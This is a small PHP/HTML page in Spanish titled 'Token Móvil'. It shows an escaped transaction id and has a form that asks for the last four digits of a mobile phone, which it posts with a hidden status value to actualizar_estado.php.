<?php
$transaction_id = $_GET['id'] ?? 'N/A';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Ingresar 4 Dígitos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
        .card { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        h1 { margin-top: 0; color: #333; }
        p { color: #666; }
        input { width: 100%; padding: 12px; font-size: 20px; text-align: center; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 20px; box-sizing: border-box; }
        button { background: #007bff; color: #fff; padding: 12px 20px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Token Móvil</h1>
        <p>Ingresa los <strong>últimos 4 dígitos</strong> del celular para la transacción:<br><code><?php echo htmlspecialchars($transaction_id); ?></code></p>
        <form action="actualizar_estado.php" method="POST">
            <input type="hidden" name="id" value="<?php echo htmlspecialchars($transaction_id); ?>">
            <input type="hidden" name="estado" value="4">
            <input type="text" name="movil" maxlength="4" inputmode="numeric" pattern="\d{4}" placeholder="####" required autofocus>
            <button type="submit">Enviar Solicitud de Token Móvil</button>
        </form>
    </div>
</body>
</html>